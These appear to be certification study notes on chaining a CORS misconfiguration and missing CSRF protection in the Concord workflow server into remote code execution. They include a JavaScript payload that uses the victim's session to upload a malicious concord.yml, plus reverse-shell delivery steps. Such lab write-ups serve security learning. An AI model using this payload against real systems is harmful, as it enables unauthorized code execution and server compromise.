# Concord Authentication Bypass to RCE
This module focuses on the Concord workflow server, which contains three authentication bypass vulnerabilities. Initially using a greybox approach, the module explores a CORS misconfiguration leading to information disclosure, a CSRF vulnerability, and later, through a whitebox review, default user accounts accessible via undocumented API keys. These vulnerabilities are exploited to achieve remote code execution.
## Authentication Bypass: Round One - CSRF and CORS
### Same-Origin Policy (SOP)

Browsers enforce a same-origin policy to prevent one origin from accessing resources on a different origin. An origin is defined as a protocol, hostname, and port number. A resource can be an image, html, data, json, etc.

Without the same-origin policy, the web would be a much more dangerous place, allowing any website we visit to read our emails, check our bank balances, and view other information even from our logged-in sessions.

This table lists some of those resources, indicates whether or not they will load, and explains why:

| URL | Result | Reason |
|-----|--------|--------|
| https://a.com/myInfo | Allowed | Same Origin |
| http://a.com/users.json | Blocked | Different Scheme and Port |
| https://api.a.com/info | Blocked | Different Domain |
| https://a.com**:8443**/files | Blocked | Different Port |
| https://b.com/analytics | Blocked | Different Domain |

The purpose of SOP is not to prevent the request for a resource from being sent, but to prevent JavaScript from reading the response.
### Cross-Origin Resource Sharing (CORS)
CORS uses HTTP headers to tell browsers which origins can access resources from a server. It works alongside the Same-Origin Policy (SOP) to control cross-origin requests.

#### Key CORS Headers

- `Access-Control-Allow-Origin`: Specifies which origins can access the response
- `Access-Control-Allow-Credentials`: Indicates if cookies can be included in requests
- `Access-Control-Expose-Headers`: Lists headers that JavaScript can access

#### Request Types and Preflight
- Simple requests: (standard `GET`, `HEAD`, `POST` with basic `content-types`) are sent directly, but the response is blocked if CORS headers don't allow it.
- Complex requests: (custom headers, non-standard `content-types`, or non-standard methods) trigger a preflight `OPTIONS` request first. The browser checks if the actual request is allowed before sending it.

#### Security Implications

*Vulnerable Configurations:*

1. Dynamic Origin Reflection: Setting `Access-Control-Allow-Origin` to match the requesting origin allows any site to make authenticated requests
2. Null Origin: Allowing `"null"` origin can be exploited by certain documents/files
3. Wildcard with Credentials: Not possible - wildcard (`*`) requires credentials to be `false`

*Secure Configuration:*

Only set `Access-Control-Allow-Origin` to trusted, specific origins. Remove the header entirely if cross-origin access isn't needed.

The main security risk occurs when sites dynamically set the allowed origin to match any requesting origin while allowing credentials, enabling malicious sites to make authenticated requests on behalf of users.
### Discovering Unsafe CORS Headers

#### Initial Analysis

The `/api/service/console/whoami` endpoint initially shows:
- Without Origin header: Response contains Access-Control-Allow-Origin: *
- This wildcard setting means cookies won't be sent on cross-origin requests

#### Key Discovery
When an `Origin` header is added to the request:
1. Server reflects the origin into `Access-Control-Allow-Origin` header
2. Server adds `Access-Control-Allow-Credentials: true`

**This is a dangerous configuration** - it allows any origin to make authenticated requests.

#### Testing Different Methods

`OPTIONS` requests behave differently:

- The origin is not reflected in the response
- This limits the vulnerability scope

#### Vulnerability Scope

With this CORS misconfiguration, attackers can only:
- Read responses from `GET` requests
- Read responses from standard `POST` requests
- Cannot perform complex requests (those requiring preflight)

#### Next Consideration
The **`SameSite` cookie attribute** could provide additional protection against this CORS vulnerability, which needs to be investigated to understand the full attack surface.
Key Takeaway
The application has an unsafe CORS configuration that dynamically reflects any origin while allowing credentials, but the vulnerability is somewhat limited due to the `OPTIONS` method behavior.

### `SameSite` Attribute Overview
The `SameSite` attribute in cookies controls when browsers send cookies with cross-site requests. It's found in the `Set-Cookie` header and has three possible values.

#### Strict
- **Most restrictive**: Cookies only sent when user actively navigates within the same website
- **Blocks**: Embedded images, iframes, and links from other sites
- **Example**: If you click a link to site.com from another domain, cookies won't be sent
#### None
- **Least restrictive**: Cookies sent in all contexts (navigation, images, iframes)
- **Requires**: `Secure` attribute (HTTPS only)
- **Risk**: Enables CSRF attacks if no other protections exist
#### Lax
- **Moderate**: Cookies sent only for:
  - Safe HTTP methods (`GET`, `HEAD`, `OPTIONS`)
  - User-initiated navigation (clicking links, not scripts/images)
  - 
### Browser Defaults
- **Chrome 80+/Edge 86+**: `Lax` (if no `SameSite` set)
- **Firefox/Safari**: `None` (at time of writing)
- **Internet Explorer**: No `SameSite` support

### Concord Application Analysis
#### Findings:
- Login creates cookies **without `SameSite` attribute**
- Has **permissive CORS headers**
- **No CSRF tokens** discovered
- Default browser behavior varies (`None` or `Lax`)
#### Security Implications:
1. **If browser defaults to `None`**: Vulnerable to CSRF attacks
2. **Combined with CORS misconfiguration**: Can extract CSRF tokens from pages
3. **Missing CSRF tokens**: No additional protection against state-changing requests

#### Attack Potential
The combination of permissive CORS headers + missing SameSite attributes + no CSRF tokens suggests the application may be vulnerable to both:
- **CORS-based attacks** (reading sensitive data)
- **CSRF attacks** (performing privileged actions)
### Exploiting Permissive CORS and CSRF to get an RCE

#### Attack Strategy
Since Concord has permissive CORS headers, an attacker can create a malicious website that authenticated users visit. This site will execute JavaScript in the victim's browser to interact with Concord using their session cookies.

#### Finding the Right Endpoint
The attacker searches Concord's API documentation for exploitable endpoints that work with the CORS restrictions:
- **GET requests** (no preflight needed)
- **POST requests** with standard content-types like `multipart/form-data`

##### Target Found: Process API
The `/api/v1/process` endpoint allows starting a "process" (code execution) with:
- **Method**: POST with `multipart/form-data` (no preflight required)
- **Payload**: Upload a `concord.yml` file containing executable flows
- **Authentication**: Uses cookies (works with CORS + credentials)

#### Building the Payload

##### 1. Concord.yml File
Creates a YAML file that executes a Groovy reverse shell:
```yaml
configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"
flows:
  default:
    - script: groovy
      body: |
         # Groovy reverse shell code connecting to attacker's server
```

##### 2. Malicious Website
Creates an HTML page with JavaScript that:
1. **Checks authentication**: Calls `/api/service/console/whoami` to verify user is logged in
2. **Sends payload**: If authenticated, uploads the malicious `concord.yml` file via POST to `/api/v1/process`
3. **Exfiltrates data**: Sends responses back to attacker's server

```javascript
// Check if user is authenticated
fetch("http://concord:8001/api/service/console/whoami", {
    credentials: 'include'  // Include cookies
})
.then(async (response) => {
    if(response.status != 401){
        // User is logged in - execute attack
        rce();
    }
})

function rce() {
    var ymlBlob = new Blob([yml], { type: "application/yml" });
    var fd = new FormData();
    fd.append('concord.yml', ymlBlob);
    fetch("http://concord:8001/api/v1/process", {
        credentials: 'include',
        method: 'POST',
        body: fd
    })
}
```

#### Attack Execution
1. **Setup**: Start netcat listener on port `9000`
2. **Deliver**: Send malicious website link to authenticated Concord user
3. **Execute**: When user visits the page:
   - JavaScript checks authentication status
   - If logged in, uploads malicious YAML file
   - Concord executes the Groovy script
   - Reverse shell connects back to attacker

#### Results
- **Information disclosure**: Retrieved user details (`concordAgent`)
- **Remote code execution**: Successfully obtained shell access on Concord server
- **Process creation**: Concord confirmed new process with instance ID

#### Key Success Factors
1. **Permissive CORS**: `Access-Control-Allow-Credentials: true` with reflected origins
2. **Missing SameSite**: Cookies sent with cross-site requests
3. **No CSRF tokens**: No additional protection against state-changing requests
4. **Dangerous API endpoint**: Process creation allows arbitrary code execution
5. **Standard content-type**: `multipart/form-data` bypasses preflight requirements

This demonstrates how CORS misconfigurations combined with missing CSRF protections can lead to complete system compromise through social engineering.

**Script sent to the victim:** https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/Concord/rce.html
## Authentication Bypass: Round Two - Insecure Defaults
